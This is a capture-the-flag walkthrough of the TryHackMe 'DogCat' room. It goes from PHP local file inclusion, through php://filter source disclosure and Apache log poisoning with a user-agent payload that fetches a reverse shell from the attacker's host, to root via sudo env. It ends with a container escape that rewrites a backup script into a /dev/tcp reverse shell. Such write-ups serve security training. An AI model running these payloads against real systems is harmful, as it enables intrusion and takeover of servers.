# [DogCat](https://tryhackme.com/room/dogcat)

## Server enumeration

Let check what we have on the machine

```bash
$ nmap -sV -sC -A 10.10.33.79 -oN nmap-initial
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 17:23 GMT
Nmap scan report for 10.10.33.79
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
```

```bash
$ whatweb 10.10.33.79
http://10.10.33.79 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.33.79], PHP[7.4.3], Title[dogcat], X-Powered-By[PHP/7.4.3]
```

Looks like we are working with PHP (and Apache)

### Directories discovery

```bash
$ gobuster dir -u http://10.10.33.79 -w /usr/share/wordlists/dirb/big.txt -x .php | tee gobuster-root 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.33.79
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/09 17:29:30 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/cat.php (Status: 200)
/cats (Status: 301)
/dog.php (Status: 200)
/dogs (Status: 301)
/flag.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/09 17:31:17 Finished
===============================================================
```

### Web exploration

Let's visit the home page of this site and manually check how it wworks

```bash
$ curl 10.10.33.79
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            </div>
</body>

</html>
```

The page `http://10.10.33.79/?view=cat` loads a photo of a cat/dog when user click on the button on the page. 


#### Params tampering

Looks like on only "dog" and "cat" are allowed (see error message "Sorry, only dogs or cats are allowed.")

```bash
$ curl http://10.10.33.79\/\?view\=xxx
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Sorry, only dogs or cats are allowed.    </div>
</body>

</html>

```

Thanks to the directories listing earlier (using gobuster), we know that we have `dog.php` and `cat.php`.
Checking the application, we know that the param `?view` loads those pages. 

```bash
$ curl http://10.10.33.79\/\?view\=dogxxx
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(dogxxx.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'dogxxx.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
    </div>
</body>

</html>
```

Looks like PHP file inclusion is an option


#### PHP File inclusion

We know that the file inclusion will only works if keyword `dog` is in the param.
Our attacks on the application are a bit difficult as the inclusion only works with php file 

```bash
$ curl http://10.10.33.79\/\?view\=dog/../index    
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Fatal error</b>:  Cannot redeclare containsStr() (previously declared in /var/www/html/index.php:17) in <b>/var/www/html/index.php</b> on line <b>17</b><br />

```

#### PHP wrappers

Using the PHP wrapper we were able to retrieve some content 

```bash
$ curl http://10.10.33.79/\?view\=php://filter/convert.base64-encode/resource\=dog 
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
</body>

</html>
```

```bash
$ echo PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

```bash
$ curl http://10.10.33.79/\?view\=php://filter/convert.base64-encode/resource\=dog/../index
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
</body>

</html>
```

```bash
$ echo PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
      $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

And we can retrieve the first flag

```bash
$ curl http://10.10.33.79/\?view\=php://filter/convert.base64-encode/resource\=dog/../flag 
```

#### Bypass extension

Now we can precise the extension and get the any file we need

```bash
$ curl http://10.10.33.79/\?ext\&view\=dog.php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<img src="dogs/4.jpg" />
    </div>
</body>

</html>
```

Let's rule out remote ile execution 

```bash
$ curl http://10.10.33.79/\?ext\&view\=http://10.11.21.99:8090/dog.php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(http://10.11.21.99:8090/dog.php): failed to open stream: no suitable wrapper could be found in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'http://10.11.21.99:8090/dog.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
    </div>
</body>

</html>
```

Let's exfiltrate any file we need from the system.


## Further enumeration

The passwd file doesn't seem to be interesting
```bash
$ curl http://10.10.33.79/\?ext\&view\=dog/../../../../etc/passwd
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    </div>
</body>

</html>
```

Looking at the access logs we can notice that the logs are being encoded.

```bash
$ curl http://10.10.33.79/\?ext\&view\=dog/../../../../var/log/apache2/access.log | tail
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12.2M    0 12.2M    0     0  7733k      0 --:--:--  0:00:01 --:--:-- 7728k
10.11.21.99 - - [09/Jan/2021:18:45:13 +0000] "GET /?ext&view=dog/../../../../var/log/apache2/error.log HTTP/1.1" 200 9276630 "-" "curl/7.72.0"
127.0.0.1 - - [09/Jan/2021:18:45:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Jan/2021:18:45:46 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.21.99 - - [09/Jan/2021:18:46:06 +0000] "GET /?ext&view=dog/../../../../var/log/apache2/error.log?echo%27try%27 HTTP/1.1" 200 719 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.11.21.99 - - [09/Jan/2021:18:46:13 +0000] "GET /?ext&view=dog/../../../../var/log/apache2/error.log HTTP/1.1" 200 9276630 "-" "curl/7.72.0"
127.0.0.1 - - [09/Jan/2021:18:46:16 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
    </div>
</body>

</html>
```

So a potential route could be to encode a PHP payload and use the index.php to interpret it (via the require).


### Logs poisonning

Using the user agent in the log we can generate some code that would write the content of a php shell on the server.

```bash
$ curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.11.21.99:8090/php-reverse-shell.php'))?>" -s http://10.10.33.79

<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            </div>
</body>

</html>
```

and let start the Python server so the victim machine can download the reverse shell

```bash
$ /usr/bin/python3 -m http.server 8090

Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
```
Visiting `http://10.10.33.79/?ext&view=dog/../../../../var/log/apache2/access.log` we can see our shell file being requested by the victim machine 

```bash
$ /usr/bin/python3 -m http.server 8090

Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.10.33.79 - - [09/Jan/2021 19:44:44] "GET /php-reverse-shell.php HTTP/1.0" 200 -
```

### Shell access

Now that we have everything in place, 

first we start a netcat listener on our kali,

then we can request the newly created shell file from the server

```bash
$ curl http://10.10.33.79/shell.php
```

We now have a shell

```bash
$ nc -nvlp 1234                       
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.33.79.
Ncat: Connection from 10.10.33.79:39172.
Linux 1dfae5a37b57 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 19:59:35 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We can know retrieve the second flag

```bash
$ ls -ail /var/www 
total 20
539756 drwxr-xr-x 1 root     root     4096 Mar 10  2020 .
539755 drwxr-xr-x 1 root     root     4096 Feb 26  2020 ..
539757 -rw-r--r-- 1 root     root       23 Mar 10  2020 flag2_QMW7JvaY2LvK.txt
549995 drwxrwxrwx 4 www-data www-data 4096 Jan  9 19:36 html
```

## Privileges escalation: www-data -> root


Doing the initial enumeration while in the server


```bash
$ sudo -l 
Matching Defaults entries for www-data on 1dfae5a37b57:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 1dfae5a37b57:
    (root) NOPASSWD: /usr/bin/env
$ 
```

Gtfobins indicates that we can use `/usr/bin/env` to break out from our restricted environment

```bash
$ sudo /usr/bin/env /bin/sh  
id
uid=0(root) gid=0(root) groups=0(root)
```
We now can get the flag 3

```bash
ls -ail /root
total 20
539736 drwx------ 1 root root 4096 Mar 10  2020 .
402504 drwxr-xr-x 1 root root 4096 Jan  9 19:14 ..
402981 -rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
402982 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
539737 -r-------- 1 root root   35 Mar 10  2020 flag3.txt
```
The flag 4 took me a little while, but I noticed that the flags where created on the same date

```bash
ls -ail /root
total 20
539736 drwx------ 1 root root 4096 Mar 10  2020 .
402504 drwxr-xr-x 1 root root 4096 Jan  9 19:14 ..
402981 -rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
402982 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
539737 -r-------- 1 root root   35 Mar 10  2020 flag3.txt
ls -ail /var/www/flag2_QMW7JvaY2LvK.txt
539757 -rw-r--r-- 1 root root 23 Mar 10  2020 /var/www/flag2_QMW7JvaY2LvK.txt


```

So I went on seraching files creates on that same day 

```bash
find / -maxdepth 1 -newermt "2020-03-10" 2>/dev/null  
/
/opt
/etc
/proc
/tmp
/dev
/root
/sys
/.dockerenv
```

More research has revealed 

```bash
/opt/backups:
total 2892
538987 drwxr-xr-x 2 root root    4096 Apr  8  2020 .
402978 drwxr-xr-x 1 root root    4096 Jan  9 19:14 ..
538989 -rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
538988 -rw-r--r-- 1 root root 2949120 Jan  9 20:51 backup.tar
```

```bash
$ cat /opt/backups/backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
$ 
```
it looks like we are in a container.


## Privileges escalation: docker env -> root

Updating the backup file with a reverse shell script

```bash     
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "bash -i >& /dev/tcp/10.11.21.99/1235 0>&1" >> /opt/backups/backup.sh
```
```bash
cat /opt/backups/backup.sh

#!/bin/bash
bash -i >& /dev/tcp/10.11.21.99/1235 0>&1
```

Then opening a listener on our Kali on port 1235, gives us a shell 

```bash
$ nc -nvlp 1235
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 10.10.33.79.
Ncat: Connection from 10.10.33.79:41136.
bash: cannot set terminal process group (7076): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# lid
lid

Command 'lid' not found, but can be installed with:

apt install id-utils

root@dogcat:~# id
id
uid=0(root) gid=0(root) groups=0(root)
````
We can retrieve the last flag

```bash
root@dogcat:~# find / -type f -name "flag4*.txt" 2>/dev/null
find / -type f -name "flag4*.txt" 2>/dev/null
/root/flag4.txt
```
